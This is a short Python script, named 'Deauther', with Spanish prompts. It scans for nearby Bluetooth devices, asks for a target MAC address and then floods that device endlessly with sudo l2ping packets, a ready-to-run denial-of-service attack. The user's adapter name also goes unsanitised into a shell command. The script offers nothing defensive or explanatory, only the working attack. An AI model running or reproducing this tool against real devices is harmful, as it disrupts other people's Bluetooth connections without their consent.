
import subprocess
import os
import re

class Deauther:

    def prepare_attack(self):

        self.show_adapter_info()
        adapter_name = input("Ingresa adaptador a usar: ")

        self.show_devices()

        while True:
            if input("¿Quieres volver a escanear? (s/n): ") == "s":
                print("Escaneando...")
                self.show_devices()
            else:
                break

        device_mac = self.verify_device(input("Ingresa la mac del dispositivo a atacar: "))
        
        return adapter_name, device_mac
    
    def verify_device(self, device_mac):
        while True:
            if self.check_mac(device_mac):
                break
            else:
                device_mac = input("Ingresa la mac del dispositivo a atacar: ")
        return device_mac

    def print_coomand_output(self, command):
        output = subprocess.check_output(command, shell=True)
        output = output.decode("utf-8")
        print (output)
        return output
    
    def show_adapter_info(self):
        command = "hciconfig"
        self.print_coomand_output(command)

        command = "hcitool dev"
        self.print_coomand_output(command)

    def show_devices(self):
        command = "hcitool scan"
        self.print_coomand_output(command)
    
    def go_to_sleep(self, adapter_name, device_mac):
        command = f"sudo l2ping -i {adapter_name} -s 600 -f {device_mac}"

        os.system(command)

    def infinite_attack(self):
        adapter_name, device_mac = self.prepare_attack()
        
        while True:
            self.go_to_sleep(adapter_name, device_mac)

    

    def check_mac(self, mac):
        mac_regex = "^([0-9A-Fa-f]{2}[:]){5}([0-9A-Fa-f]{2})$"
        if re.match(mac_regex, mac):
            return True
        else:
            print(f"Mac invalida: {mac}")
            return False
        
            

## Attack
Obj = Deauther()
Obj.infinite_attack()